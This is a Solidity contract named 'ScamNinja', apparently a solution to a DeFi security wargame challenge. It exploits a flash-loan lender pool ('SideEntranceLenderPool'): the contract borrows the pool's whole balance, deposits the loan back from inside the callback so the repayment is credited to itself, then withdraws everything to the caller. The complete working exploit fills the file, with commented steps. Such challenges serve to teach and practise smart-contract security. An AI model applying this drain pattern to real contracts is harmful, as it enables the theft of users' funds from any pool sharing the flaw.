// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract ScamNinja {
    /**
    @param _lenderAddr Address of lender contract
    @dev The hack is in two stages - First, this contract takes a flash loan and executes `deposit()` on lender, thus returning all funds back to lender BUT opening a deposit under this contract.

    Now, flash loan would complete because we returned all funds, but we do have a deposit under us. We then proceed to call `withdraw()` and drain all funds.
     */
    function stealAllEth(address _lenderAddr) external {
        SideEntranceLenderPool lender = SideEntranceLenderPool(_lenderAddr);

        // 1. Take flash loan
        lender.flashLoan(address(lender).balance);

        // 3. Withdraw 'our' deposit, send to hacker
        lender.withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    /**
    @dev Callback function called by lender with loan amount
     */
    function execute() external payable {
        SideEntranceLenderPool lender = SideEntranceLenderPool(msg.sender);

        // 2. Create deposit under this contract by returning all borrowed funds back
        lender.deposit{value: address(this).balance}();
    }

    /**
    @dev To receive funds
     */
    receive() external payable {}
}
